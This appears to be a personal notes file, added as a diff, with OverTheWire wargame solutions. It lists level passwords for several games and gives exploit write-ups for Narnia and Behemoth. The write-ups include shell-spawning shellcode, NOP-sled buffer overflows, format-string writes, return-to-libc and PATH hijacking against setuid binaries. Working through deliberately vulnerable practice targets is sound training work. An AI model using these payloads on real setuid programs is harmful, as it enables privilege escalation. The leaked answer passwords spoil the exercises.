@@ -1,0 +1,371 @@
+# Over The Wire Flags
+
+################################## Bandit #####################################
+0->1: NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
+1->2: rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi
+2->3: aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG
+3->4: 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe
+4->5: lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR
+5->6: P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU
+6->7: z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S
+7->8: TESKZC0XvTetK0S9xNwm25STk5iWrBvP
+8->9: EN632PlfYiZbn3PhVK3XOGSlNInNE00t
+9->10: G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
+10->11: 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
+11->12: JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv
+12->13: wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw
+13->14: fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq
+14->15: jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
+15->16: JQttfApK4SeyHwDlI9SXGR50qclOAil1
+16->17: VwOSWtCA7lRKkTfbr2IDh6awj9RNZM5e
+17->18: hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg
+18->19: awhqfNnAbc1naukrpqDYcF95h7HoMTrC
+19->20: VxCazJaVykI6W36BkBU0mJTCM8rR95XT
+20->21: NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
+21->22: WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
+22->23: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+23->24: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+24->25: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+25->26: c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
+26->27: YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
+27->28: AVanL161y9rsbcJIsFHuw35rjaOM19nR
+28->29: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
+29->30: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS
+30->31: OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt
+31->32: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
+32->33: odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
+
+################################## Leviathan ##################################
+0->1: PPIfmI1qsA
+1->2: mEh5PNl10e
+2->3: Q0G8j4sakn
+3->4: AgvropI4OA
+4->5: EKKlTF1Xqs
+5->6: YZ55XPVk2l
+6->7: 8GpZ5f8Hze
+
+################################## Krypton ####################################
+*** base64 encode/decode
+*** tr translate/delete characters
+0->1: KRYPTONISGREAT
+1->2: ROTTEN
+2->3: CAESARISEASY
+3->4: BRUTE
+4->5: CLEARTEXT
+5->6: 
+6->7: 
+
+################################## Natas ######################################
+0->1: g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
+1->2: h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
+2->3: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
+3->4: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
+4->5: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
+5->6: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
+6->7: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
+7->8: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
+8->9: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
+9->10: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+10->11: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+
+
+################################## Narnia #####################################
+
+Level 0: 
+Exploit: Buffer Overflow
+
+Stack
+Low
+|___________|
+|           |
+|    buf    |  20 bytes
+|___________|
+|           |
+|    val    |  4 bytes 
+|___________|
+|           |
+High
+
+* Pass buf a 24 byte input. The last 4 bytes will overwrite val. 
+* To make the last 4 bytes 0xdeadbeef we can do "\xef\xbe\xad\xde"
+
+perl -e 'print "A"x20 . "\xef\xbe\xad\xde"' | ./narnia0
+
+password: eaa6AjYMBB
+
+###############################################################################
+
+Level 1:
+Exploit: Environment Variable Shellcode 
+
+* There is a function ptr to the result of getenv. The function ptr is then 
+  executed. 
+* To get the shell create environment variable with shellcode execve("/bin/bash", -p)
+  -p is required so that the suid rights transfer and we can use as narnia2
+
+https://shell-storm.org/shellcode/files/shellcode-607.html
+export EGG=$(perl -e 'print "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
+
+password: Zzb6MIyceT
+
+###############################################################################
+
+Level 2:
+Exploit: Buffer Overflow Shellcode Injection
+
+Stack
+Low
+|_______________|
+|               |
+|      buf      |  128 bytes
+|_______________|
+|               |
+|      ...      |
+|_______________|
+|               |
+|  return addr  |  4 bytes
+|_______________|
+|               |
+High
+
+* Unchecked strcpy into buf. We can overwrite the return address to the buf and have buffer store
+  shellcode
+* buf will look like this
+ 75 bytes of NOP | 57 bytes of shellcode | 4 bytes for new return address 
+$(perl -e 'print "\x90"x75 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81" . "\x60\xd7\xff\xff"')
+
+password: 8SyQ2wyEDU
+
+###############################################################################
+
+Level 3:
+Exploit: Buffer Overflow 
+
+Stack
+Low
+|_________|
+|         |
+|  ifile  |  32 bytes
+|_________|
+|         |
+|  ofile  |  16 bytes
+|_________|
+|         |
+High
+
+* Unchecked strcpy into ifile. We can overwrite the ofile location from /dev/null to somewhere
+  that can be read (total of 48 byte input)
+* Need input file to be 32 bytes long and output file to be 16 bytes long. Because narnia3 is 
+  owned by narnia4 and suid, it will use narnia4. Because the password file is not 32 bytes long,
+	we can create a symbolic link to a file that is. Then create a designated output file that is 
+	16 bytes long
+
+ln -s /etc/narnia_pass/narnia4 /tmp/AAABBBCCCDDDEEEFFFGGGHHHIII/tmp/tmp4pass
+$(perl -e 'print "/tmp/AAABBBCCCDDDEEEFFFGGGHHHIII" . "/tmp/tmp4pass" ')
+* Input file is /tmp/AAABBBCCCDDDEEEFFFGGGHHHIII/tmp/tmp4pass which is a symbolic 
+  link to actual 
+  password. The output file is /tmp/tmp4pass which is owned by us (narnia3). 
+
+password: aKNxxrpDc1
+
+###############################################################################
+
+Level 4:
+Exploit: Buffer Overflow
+
+Stack
+Low
+|_______________|
+|               |
+|     buffer    |  256 bytes
+|_______________|
+|               |
+|       i       |  4 bytes
+|_______________|
+|               |
+|  frame ptr?   |  4 bytes 
+|_______________|
+|               |
+|  return addr  |  4 bytes
+|_______________|
+|               |
+High
+
+* Deletes all envrionment variables
+* Unchecked strcpy into buffer. We can overwrite the return addr and execute shellcode 
+  in buffer.
+
+  268 byte input into buffer will overwrite the return address 
+
+ 207 bytes of NOP | 57 bytes of shellcode | 4 bytes return address 
+$(perl -e 'print "\x90"x207 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81" . "\xd0\xd6\xff\xff" ')
+
+password: 1oCoEkRJSB
+
+###############################################################################
+
+Level 5:
+Exploit: Format String 
+
+Stack
+Low
+|__________|
+|          |
+|  buffer  |  64 bytes
+|__________|
+|          |
+|     i    |  4 bytes 
+|__________|
+|          |
+High
+
+* Copy string into buffer without format parameters. 
+* We can thus use %n to write to i's memory address and overwrite it to 500
+* To find the value location of where our addr of i is for snprintf, we can do 
+$(perl -e 'print "AAAA"')%x.%x.%x.%x
+* matching it with 0x41414141 will be the nth argument we can use for exploit
+
+address of i, %x 500, go to addr arg or %n$, write the value 500 to address of i using %n
+$(perl -e 'print "\xd0\xd5\xff\xff" . "%496x%1\$n"')
+
+password: BAV0SUV0iM
+
+###############################################################################
+
+Level 6:
+Exploit: Return-to-libc
+
+Stack
+Low
+|       |  <- esp 
+|_______|
+|       |
+|  b2   |  8 bytes
+|_______|
+|       |
+|  b1   |  8 bytes
+|_______|
+|       |
+|  fp   |  4 bytes   As to why fp is here I will never know???
+|_______|
+|       |
+High
+
+* We want to overwrite fp to point to system libc. We then want to have an arg for system to be
+  /bin/sh 
+* To overwrite fp we can need to overflow b1 (1st arg)  with 12 bytes. the last 4 bytes will be the
+  new libc function addr. 
+* We can have fp hold system lib c function addr. the parameter is to open a shell so /bin/sh must 
+  be placed into b1 before fp overflow address 
+
+$(perl -e 'print "/bin/sh;" . "\x70\x81\xc4\xf7 " . "B"x4 ')
+
+password: YY4F9UaB60
+
+###############################################################################
+
+Level 7:
+Exploit: buffer overflow function pointer 
+
+Stack
+Low
+|__________|
+|          |
+|   ptrf   |  4 bytes 
+|__________|
+|          |
+|  buffer  |  128 bytes 
+|__________|
+|          |
+High
+
+* Format String vulnerability as format is just passed in without any format parameters 
+snprintf(buffer, sizeof buffer, format); 
+* Using format string write the location of ptrf the function address of hacked function 
+* The first argument is already buffer for printf so we can simply do 1 %x then a %n
+
+$(perl -e 'print "\x08\xd5\xff\xff" . "%134517531x%n" ')
+                     ptrf addr    offset to hacked fctn addr   write to ptrf addr
+
+password: 1aBcDgPttG
+
+
+################################## Behemoth ###################################
+
+Level 0:
+Exlpoit: ltrace
+
+* Using ltrace shows that the program calls strcmp on the user input password and the 
+  actual password for the file.
+
+password: 8YpAQCAuKf
+
+###############################################################################
+
+Level 1:
+Exploit: Buffer Overflow
+
+Stack
+Low
+|_______________|
+|               |
+|     buffer    |  68 bytes 
+|_______________|
+|               |
+|      ...      |  4 bytes of something
+|_______________|
+|               |
+|  return addr  |  4 bytes 
+|_______________|
+|               |
+High
+
+* There is a buffer overflow for the password. A 71 + 4 byte input will completely 
+  overflow 
+* We can find how many bytes before segmentation overflow by using cyclic cmd
+
+cyclic 1000 - generates patterm of 1000 chars (1000 bytes). When program crashes
+cyclic -l <address of interest>
+
+  the return address 
+* Can overwrite the return addr to point to an environment variable address with 
+  shellcode to open new shell
+* To find the address of a specific environment variable we can run gdb and print out the
+  memory address of environ  (doesn't work well?)
+
+	x/s *((char **)environ+i)
+  where i is the index of environment variable 
+
+* We can also create a program to print the location of environment variable using getenv
+
+* We can create an environment variable with NOP sled and shellcode as shown below
+
+export SHELLCODE=$(perl -e 'print "\x90"x20 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
+
+(perl -e 'print "\x90"x71 . "\xb1\xd5\xff\xff"';cat) | ./behemoth1
+
+password: IxPJbQtH8q
+
+###############################################################################
+
+Level 2:
+Exploit: Path Priviledge Escalation
+
+* ltrace shows that permissions are elavated and there is a system() cmd without a 
+  full path <touch>
+* Creating a file with the same name as the cmd <touch> will execute our bash cmd 
+* Need to add the current directory to the path so that the file will be found and 
+  executed first over the actual path to the cmd <touch>
+
+echo "/bin/bash" > touch
+chmod 777 touch
+export PATH=.:$PATH
+
+password: JQ6tZGqt0i
+
+###############################################################################
+
+Level 3:
+Exploit: 
+
+
